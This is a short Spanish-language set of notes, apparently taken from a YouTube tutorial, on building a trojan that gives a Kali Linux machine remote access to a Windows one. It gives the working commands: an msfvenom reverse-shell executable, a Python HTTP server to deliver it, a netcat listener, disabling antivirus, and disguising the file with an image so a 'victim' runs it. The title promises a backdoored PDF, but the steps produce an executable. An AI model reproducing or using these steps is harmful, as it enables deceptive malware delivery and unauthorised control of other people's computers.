crear documento PDF que contenga una backdoor que nos de aceso remoto
desde una maquina kali linux a una maquina windows.

link : https://www.youtube.com/watch?v=HhE66_ibnL8

debemos saber nuestra ip:
ifconfig

creamos el archivo y lo guardamos en el escritorio:

──(root㉿kali)-[/home/kali/Desktop]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f exe -o peligro.exe

ahora lo compartimos por un servidor python:
──(root㉿kali)-[/home/kali/Desktop]
└─# python -m http.server 80

debemos desactivar el antivirus. 

abrimos la ip en el navegador:
192.168.1.10

y descargamos el archivo

nos ponemos en escucha:
──(root㉿kali)-[/home/kali/Desktop]
└─# nc -nlvp 443    

descargamos una imagen para camuflar el archivo
es importante q no tenga fondo.


en cuanto la victima ejecute este troyano vamos a tener acceso remoto a la maquina victima
